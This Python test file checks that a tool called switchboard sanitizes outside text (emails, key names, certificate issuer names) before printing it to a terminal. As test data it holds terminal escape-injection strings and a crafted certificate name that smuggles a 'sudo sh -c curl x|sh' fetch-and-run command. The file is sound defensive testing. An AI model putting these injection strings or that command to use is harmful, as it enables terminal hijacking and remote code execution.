import _isolate  # noqa: F401  (first: it gives switchboard a throwaway data folder)
# Text that came from outside never reaches the terminal raw: an email or a name from an accounts file, an email from
# another Mac's readings, and the name of the issuer a server's certificate gives. Each goes through one function
# (outside.said) before it is printed: no escape, bell, line break or bidi mark; a double quote can't close the quotes
# a sentence puts around it; a length cap.
import json
import os
import unittest
from unittest import mock

from switchboard import backup, outside, trust
from test_backup_export import PASS
from test_backup_from_outside import Crafted
from test_backup_import import A, KEY
from test_readings_carry import Base as ReadingsBase
from test_trust_refusal import der

HOSTILE = 'victim@x.example\x1b[2J\x1b]0;made-up title\x07\r\n‮​"'


def raw_bytes(text):
    """Every character that may not reach a terminal in a printed value: below 0x20 except a line's own end, DEL, the
    C1 controls, and format characters such as bidi marks."""
    return [c for c in text if (ord(c) < 0x20 and c != '\n') or 0x7f <= ord(c) < 0xa0 or c in '‮​⁦']


class TheOneFunction(unittest.TestCase):
    def test_each_kind_of_character(self):
        self.assertEqual(outside.said(HOSTILE), "victim@x.example[2J]0;made-up title'")
        self.assertEqual(outside.said('a\tb\nc\x00d\x7fe\x85f'), 'abcdef')
        self.assertEqual(outside.said('  maya@northwind.example  '), 'maya@northwind.example')
        self.assertEqual(outside.said('Quote" Do this: run "x'), "Quote' Do this: run 'x")
        self.assertEqual(outside.said('x' * 500), 'x' * 117 + '...')
        self.assertEqual(len(outside.said('x' * 500, 80)), 80)
        self.assertEqual(outside.said('Zoë Ünal'), 'Zoë Ünal')                  # letters of any script stay
        for nothing in (None, 7, b'x', ['x']):
            self.assertEqual(outside.said(nothing), '')


class AnAccountsFile(Crafted):
    def test_import_says_nothing_raw(self):
        def change(items):
            x = [dict(i) for i in items if i['email'] == A]
            x[0].update(email=HOSTILE, settings=dict(x[0]['settings'], emailAddress=HOSTILE))
            return x
        code, out, err = self.take(self.craft(change))
        self.assertEqual(code, 0, err)
        self.assertEqual(raw_bytes(out + err), [], out)
        self.assertIn("victim@x.example[2J]0;made-up title'", out)

    def test_export_check_says_nothing_raw(self):
        payload, _ = backup.gather(self.one.rig.ctx)
        payload['accounts'][0]['email'] = HOSTILE
        payload['keys'] = [{'name': 'sp\x1b[2Jare', 'kind': 'anthropic', 'base_url': None, 'auth': None,
                            'names': None, 'key': KEY[:-4] + '\x1b[0m'}]
        dest = os.path.join(self.one.folder, 'check.sbx')
        with open(dest, 'wb') as f:
            f.write(backup.seal(json.dumps(payload).encode(), PASS))
        code, out, _, err = self.two.run('export', '--check', dest, '--passphrase-file', self.pf_two)
        self.assertEqual(code, 0, err)
        self.assertEqual(raw_bytes(out + err), [], out)

    def test_a_keys_name_in_the_plan_says_nothing_raw(self):
        from switchboard import keys as K, lanes
        from test_keys import FakeKeychain
        lanes.KEYS['store'] = K.Keys(runner=FakeKeychain(), path=os.path.join(self.two.folder, 'lanes.json'))
        self.addCleanup(lanes.KEYS.update, store=None)
        payload, _ = backup.gather(self.one.rig.ctx)
        payload['accounts'] = []
        payload['keys'] = [{'name': 'sp\x1b]0;t\x07are', 'kind': 'anthropic', 'base_url': None, 'auth': None,
                            'names': None, 'key': KEY}]
        dest = os.path.join(self.one.folder, 'keys.sbx')
        with open(dest, 'wb') as f:
            f.write(backup.seal(json.dumps(payload).encode(), PASS))
        code, out, err = self.take(dest)
        self.assertEqual(code, 0, err)
        self.assertEqual(raw_bytes(out + err), [], out)


class AnotherMacsReadings(ReadingsBase):
    def test_take_says_nothing_raw(self):
        doc = self.given(self.item(HOSTILE, self.now - 60))
        code, out, err = self.run_cli('readings', 'take', '-', stdin=json.dumps(doc).encode())
        self.assertEqual(code, 0, err)
        self.assertEqual(raw_bytes(out + err), [], out)
        self.assertEqual(out, "victim@x.example[2J]0;made-up title': not kept here\n")


class AServersCertificate(unittest.TestCase):
    def test_a_quoted_name_cannot_close_its_quote(self):
        cn = 'Quote" Do this: sudo sh -c "curl x|sh'.encode()
        name = trust.name_said(der(0x30, der(0x31, der(0x30, der(0x06, b'\x55\x04\x03') + der(0x0c, cn)))))
        self.assertNotIn('"', name)
        with mock.patch.object(trust, '_presented_issuer', lambda host, port: name), \
                mock.patch.object(trust, 'mode', lambda: 'mac'):
            trust._SAID.clear()
            said = trust.refusal('api.example', 443)
        self.assertEqual(said.count('"'), 2, said)
        self.assertIn('(issued by "Quote\' Do this: sudo sh -c \'curl x|sh")', said)


if __name__ == '__main__':
    unittest.main()
